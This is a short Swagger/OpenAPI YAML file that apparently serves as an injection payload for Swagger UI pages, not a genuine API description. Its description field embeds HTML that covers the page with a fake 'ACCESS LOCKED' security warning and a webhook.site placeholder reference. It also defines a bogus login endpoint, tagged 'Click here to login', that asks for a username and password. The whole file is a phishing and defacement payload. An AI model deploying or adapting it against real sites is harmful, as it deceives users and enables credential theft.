swagger: '2.0'
info:
  version: 1.0.0
  title: 'Swagger UI'
  description: '<div style="position:fixed;inset:0;background:#000;z-index:99999;display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:monospace;color:#ff0055;"><div style="font-size:34px;font-weight:bold;">ACCESS LOCKED</div><div style="color:#fff;font-size:15px;margin-top:14px;text-align:center;">Unauthorised configuration detected on this endpoint.<br>Contact your security administrator immediately.</div><div style="color:#666;font-size:12px;margin-top:30px;">ref-code: webhook.site/REPLACE-ME</div></div>'
paths:
  /Login_Page:
    post:
      summary: Login here to continue
      description: Please provide your credentials to continue.
      parameters:
        - name: username
          in: formData
          description: The username for login
          required: true
          type: string
        - name: password
          in: formData
          description: The password for login
          required: true
          type: string
      tags:
        - Click here to login
      responses:
        '200':
          description: OK
        '400':
          description: Bad request
        '500':
          description: Server error
